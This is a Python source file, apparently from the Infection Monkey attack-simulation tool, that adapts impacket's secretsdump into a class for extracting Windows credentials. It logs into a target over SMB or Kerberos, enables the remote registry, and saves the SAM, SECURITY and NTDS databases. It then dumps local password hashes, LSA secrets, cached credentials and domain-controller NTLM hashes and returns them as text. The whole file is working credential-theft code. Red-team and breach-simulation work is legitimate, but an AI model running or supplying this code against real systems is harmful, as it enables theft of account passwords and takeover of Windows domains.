import logging
import os
import traceback

from impacket.examples.secretsdump import (LocalOperations, LSASecrets,
                                           NTDSHashes, RemoteOperations,
                                           SAMHashes)
from impacket.smbconnection import SMBConnection

from infection_monkey.utils.capture_output import StdoutCapture

LOG = logging.getLogger(__name__)


# Adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
# Used to get Administrator and original DC passwords' hashes
class DumpSecrets:
    def __init__(self, remote_name, username='', password='', domain='', options=None):
        self.__use_VSS_method = options.use_vss
        self.__remote_name = remote_name
        self.__remote_host = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__smb_connection = None
        self.__remote_ops = None
        self.__SAM_hashes = None
        self.__NTDS_hashes = None
        self.__LSA_secrets = None
        self.__system_hive = options.system
        self.__bootkey = options.bootkey
        self.__security_hive = options.security
        self.__sam_hive = options.sam
        self.__ntds_file = options.ntds
        self.__no_lmhash = options.no_lmhash
        self.__is_remote = options.is_remote
        self.__do_kerberos = options.k
        self.__just_DC = options.just_dc
        self.__just_DC_NTLM = options.just_dc_ntlm
        self.__can_process_SAM_LSA = options.can_process_SAM_LSA
        self.__kdc_host = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smb_connection = SMBConnection(
            self.__remote_name, self.__remote_host)
        self.__smb_connection.login(
            self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        output_captor = StdoutCapture()
        output_captor.capture_stdout_output()

        dumped_secrets = ''

        try:
            if self.__remote_name.upper() == 'LOCAL' and self.__username == '':
                self.__is_remote = False
                self.__use_VSS_method = True
                if self.__system_hive:
                    local_operations = LocalOperations(self.__system_hive)
                    bootkey = local_operations.getBootKey()
                    if self.__ntds_file is not None:
                        # Let's grab target's configuration about LM Hashes storage.
                        self.__no_lmhash = local_operations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootkey = binascii.unhexlify(self.__bootkey)

            else:
                self.__is_remote = True
                bootkey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__do_kerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            LOG.debug(
                                'SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                        else:
                            raise

                    self.__remote_ops = RemoteOperations(
                        self.__smb_connection, self.__do_kerberos, self.__kdc_host)
                    self.__remote_ops.setExecMethod(self.__options.exec_method)
                    if self.__just_DC is False and self.__just_DC_NTLM is False or self.__use_VSS_method is True:
                        self.__remote_ops.enableRegistry()
                        bootkey = self.__remote_ops.getBootKey()
                        # Let's check whether target system stores LM Hashes.
                        self.__no_lmhash = self.__remote_ops.checkNoLMHashPolicy()
                except Exception as e:
                    self.__can_process_SAM_LSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                            and self.__do_kerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off.
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/.
                        LOG.error('Policy SPN target name validation might be restricting full DRSUAPI dump.' +
                                  'Try -just-dc-user')
                    else:
                        LOG.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA.
            if self.__just_DC is False and self.__just_DC_NTLM is False and self.__can_process_SAM_LSA:
                try:
                    if self.__is_remote is True:
                        SAM_file_name = self.__remote_ops.saveSAM()
                    else:
                        SAM_file_name = self.__sam_hive

                    self.__SAM_hashes = SAMHashes(
                        SAM_file_name, bootkey, isRemote=self.__is_remote)
                    self.__SAM_hashes.dump()
                except Exception as e:
                    LOG.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__is_remote is True:
                        SECURITY_file_name = self.__remote_ops.saveSECURITY()
                    else:
                        SECURITY_file_name = self.__security_hive

                    self.__LSA_secrets = LSASecrets(SECURITY_file_name, bootkey, self.__remote_ops,
                                                    isRemote=self.__is_remote)
                    self.__LSA_secrets.dumpCachedHashes()
                    self.__LSA_secrets.dumpSecrets()
                except Exception as e:
                    LOG.debug(traceback.print_exc())
                    LOG.error('LSA hashes extraction failed: %s' % str(e))

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work.
            if self.__is_remote is True:
                if self.__use_VSS_method and self.__remote_ops is not None:
                    NTDS_file_name = self.__remote_ops.saveNTDS()
                else:
                    NTDS_file_name = None
            else:
                NTDS_file_name = self.__ntds_file

            self.__NTDS_hashes = NTDSHashes(NTDS_file_name, bootkey, isRemote=self.__is_remote,
                                            noLMHash=self.__no_lmhash, remoteOps=self.__remote_ops,
                                            useVSSMethod=self.__use_VSS_method, justNTLM=self.__just_DC_NTLM,
                                            )
            try:
                self.__NTDS_hashes.dump()
            except Exception as e:
                LOG.debug(traceback.print_exc())
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resume_file = self.__NTDS_hashes.getResumeSessionFile()
                    if resume_file is not None:
                        os.unlink(resume_file)
                LOG.error(e)
                if self.__use_VSS_method is False:
                    LOG.error(
                        'Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            LOG.debug(traceback.print_exc())
            LOG.error(e)
            if self.__NTDS_hashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    resume_file = self.__NTDS_hashes.getResumeSessionFile()
                    if resume_file is not None:
                        os.unlink(resume_file)
            try:
                self.cleanup()
            except Exception:
                pass
        finally:
            dumped_secrets = output_captor.get_captured_stdout_output()  # includes hashes and kerberos keys
            return dumped_secrets

    def cleanup(self):
        LOG.debug('Cleaning up...')
        if self.__remote_ops:
            self.__remote_ops.finish()
        if self.__SAM_hashes:
            self.__SAM_hashes.finish()
        if self.__LSA_secrets:
            self.__LSA_secrets.finish()
        if self.__NTDS_hashes:
            self.__NTDS_hashes.finish()
